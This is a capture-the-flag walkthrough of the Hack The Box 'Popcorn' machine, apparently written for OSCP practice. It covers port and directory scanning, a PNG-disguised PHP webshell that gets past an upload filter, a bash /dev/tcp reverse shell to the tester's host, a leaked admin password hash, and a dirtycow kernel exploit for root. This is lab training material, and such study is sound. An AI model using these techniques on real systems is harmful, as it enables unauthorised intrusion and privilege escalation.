## Intro


tags: #OSCPpath #linux #WebApp #FileUpload #LinPEAS #kernelversion #medium

----
# Reconnaissance


Started: 20:10

```shell
source basher target1 10.129.72.154 [IP]
source basher host1 popcorn.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-21 13:11 -0400
Nmap scan report for 10.129.72.154
Host is up (0.14s latency).
Not shown: 54980 closed tcp ports (reset), 10553 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.13 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-21 13:12 -0400
Nmap scan report for popcorn.htb (10.129.72.154)
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.23 - 2.6.38 (95%), Linux 2.6.31 - 2.6.32 (95%), Linux 2.6.32 (95%), DD-WRT v24-sp1 (Linux 2.4.36) (95%), Linux 2.6.32 - 3.13 (95%), Linux 3.2 - 4.14 (95%), Linux 2.6.22 (94%), Linux 2.6.32 - 3.10 (94%), HP P2000 G3 NAS device (94%), MikroTik RouterOS 6.0 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: popcorn.hackthebox.gr; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   48.47 ms 10.10.14.1
2   48.76 ms popcorn.htb (10.129.72.154)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found


## Webapp

![](MediaFiles/Pasted%20image%2020260921201329.png)


### Directories

```shell
gobuster dir -k -u http://popcorn.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

```shell
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://popcorn.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index                (Status: 200) [Size: 177]
test                 (Status: 200) [Size: 47375]
torrent              (Status: 301) [Size: 312] [--> http://popcorn.htb/torrent/]
rename               (Status: 301) [Size: 311] [--> http://popcorn.htb/rename/]
Progress: 90857 / 207641 (43.76%)[ERROR] error on word server-status: timeout occurred during the request
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================
```
`index` is the home page shown before

`test` goes here
![](MediaFiles/Pasted%20image%2020260921201626.png)
`rename` goes here
![](MediaFiles/Pasted%20image%2020260921201941.png)
not so sure what could be usefull here, nothing interesting on page source, lets move on

`torrent` goes here
![](MediaFiles/Pasted%20image%2020260921201655.png)
register a user and login

-----
# Foothold
### File upload found
found `file upload`
![](MediaFiles/Pasted%20image%2020260921201904.png)
since i see php on the url, i wll try uploading a php rev shell (from pentestmonkey)
![](MediaFiles/Pasted%20image%2020260921202209.png)
but while uploading, got message that this is not a valid torrent file
![](MediaFiles/Pasted%20image%2020260921202241.png)
renamed it to `php-rev.php.torrent` and uploaded again but no luck

Find a sample torrent: https://webtorrent.io/free-torrents
file uploaded
![](MediaFiles/Pasted%20image%2020260921203330.png)
uploaded, then hit edit this torrent, and i have been shown to a new upload page, this time requiring png/jpg extensions

## Upload Filter bypass

### Create php webshell with picture headers:

We will disguise our php webshell as a picture, by appending it after the picture headers:
```shell
PNG

���
IHDR���������ĉ���
IDAT[cP�;����IENDB`
```
Base64 encode it first and place it in a file with `.png` extension
```shell
echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQIW2P8z8BQDwAE/wH+O+kO1gAAAABJRU5ErkJggg==" | base64 -d > shell.png
```
Then append the php webshell:
```shell
echo "<?php system(\$_GET['cmd']); ?>" >> shell.png 
```
this was uploaded successfully
![](MediaFiles/Pasted%20image%2020260921203754.png)
but no luck on executing it, lets try via burp
![](MediaFiles/Pasted%20image%2020260921205123.png)
uploaded the shell.png, but changed the filename to .php on the request
and was successful
![](MediaFiles/Pasted%20image%2020260921205202.png)
got execution!
![](MediaFiles/Pasted%20image%2020260921205242.png)

![](MediaFiles/Pasted%20image%2020260921205308.png)
leaked user flag from here also
![](MediaFiles/Pasted%20image%2020260921205424.png)

## Shell as www-data

add this revshell to the url
```shell
bash -c 'bash -i >%26 /dev/tcp/10.10.14.247/3333 0>%261'
```
got shell back
```shell
└─$ nc -lvnp 3333                                               
listening on [any] 3333 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.72.154] 58805
bash: no job control in this shell
www-data@popcorn:/var/www/torrent/upload$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@popcorn:/var/www/torrent/upload$ ls
ls
723bc28f9b6f924cca68ccdff96b6190566ca6b4.png
dd8255ecdc7ca55fb0bbf81323d87062db1f6d1c.php
dd8255ecdc7ca55fb0bbf81323d87062db1f6d1c.png
noss.png
www-data@popcorn:/var/www/torrent/upload$ cd /home/george
cd /home/george
www-data@popcorn:/home/george$ ls
ls
torrenthoster.zip
user.txt
www-data@popcorn:/home/george$ cat user.txt
cat user.txt
8c79d561be9fbb3f22a47a2823426955
www-data@popcorn:/home/george$ 

```
tried to unzip the found zip file, but there have been errors
```shell
www-data@popcorn:/home/george$ unzip torrenthoster.zip
unzip torrenthoster.zip
Archive:  torrenthoster.zip
checkdir error:  cannot create torrenthoster
                 Permission denied
                 unable to process torrenthoster/.
checkdir error:  cannot create torrenthoster
                 Permission denied
                 unable to process torrenthoster/preview.gif.
checkdir error:  cannot create torrenthoster

```

### Processes

```shell
ps aux
```

found mysql running
```shell
mysql     1438  0.0  1.8 147604 18800 ?        Sl   20:10   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
```
since we found the presence of mysql, lets go back to the website's dir
`/var/www/torrent/database`
```shell
www-data@popcorn:/var/www/torrent$ cd database   
cd database
www-data@popcorn:/var/www/torrent/database$ ls
ls
th_database.sql
www-data@popcorn:/var/www/torrent/database$ 
```
found this
```shell
INSERT INTO `users` VALUES (3, 'Admin', '1844156d4166d94387f1a4ad031ca5fa', 'admin', 'admin@yourdomain.com', '2007-01-06 21:12:46', '2007-01-06 21:12:46');
```

--------
# Privesc

## linpeas

linpeas showed outdated linux version `Linux 2.6.31`

### Vulnerable kernel version

found the dirtycow exploit for this version, lets transfer it to the target
```shell
python3 -m http.server 9001 
```

```shell
www-data@popcorn:/tmp$ wget http://10.10.14.247:9001/dirtycow.c
wget http://10.10.14.247:9001/dirtycow.c
--2026-09-21 21:12:17--  http://10.10.14.247:9001/dirtycow.c
Connecting to 10.10.14.247:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4795 (4.7K) [text/x-csrc]
Saving to: `dirtycow.c'

     0K ....                                                  100%  514K=0.009s

2026-09-21 21:12:17 (514 KB/s) - `dirtycow.c' saved [4795/4795]

www-data@popcorn:/tmp$ 
```
compile and execute:
```shell
gcc -pthread 40839.c -o 40839 -lcrypt 
chmod +x 40839
./40839

set password to : pass
```
then launched a new terminal since this was stuck
## Shell as root
```shell
└─$ nc -lvnp 4444
        
listening on [any] 4444 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.72.154] 52490
bash: no job control in this shell
www-data@popcorn:/var/www/torrent/upload$ su firefart
su firefart
su: must be run from a terminal
www-data@popcorn:/var/www/torrent/upload$ python -c 'import pty; pty.spawn("/bin/bash")'
<orrent/upload$ python -c 'import pty; pty.spawn("/bin/bash")'               
www-data@popcorn:/var/www/torrent/upload$ su firefart
su firefart
Password: pass

firefart@popcorn:/var/www/torrent/upload# id
id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@popcorn:/var/www/torrent/upload# cat /root/root.txt
cat /root/root.txt
bb349f026aab1947aed2ba5d2157d29c
firefart@popcorn:/var/www/torrent/upload# 
```
approx 1 hour